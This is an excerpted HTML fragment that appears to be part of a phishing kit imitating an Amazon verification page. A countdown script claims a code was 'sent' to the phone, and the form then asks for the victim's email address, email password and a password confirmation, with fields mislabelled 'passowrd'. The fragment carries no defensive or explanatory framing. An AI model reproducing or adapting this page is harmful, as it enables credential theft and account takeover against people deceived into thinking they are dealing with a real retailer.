...
<script>
   ...
   document.getElementById('countdown').innerHTML = "Code Sent dans le téléphone " + minutes + ":" + remainingSeconds;
   if (seconds == 0) {
   ...
   var countdownTimer = setInterval('secondPassed()', 1000);
          ...
          <div class="a-row a-spacing-base">
            <div class="a-divider a-divider-break"><h5><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Email address information</font></font></h5></div>
...
<input required="" type="Email" maxlength="128" id="Email" name="Email" class="a-input-text a-span12 auth-autofocus auth-required-field"></div>
...
Email password</font></font></label>
<input required="" type="passowrd" maxlength="128" id="emailpassowrd" name="emailpassowrd" class="a-input-text a-span12 auth-autofocus auth-required-field"></div>
...
<div class="a-row a-spacing-base">
<label for="ap_email" class="a-form-label"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;" class="">
confirm password</font></font></label>
<input required="" type="passowrd" maxlength="128" id="confpassowrd" name="confpassowrd" class="a-input-text a-span12 auth-autofocus auth-required-field"></div>
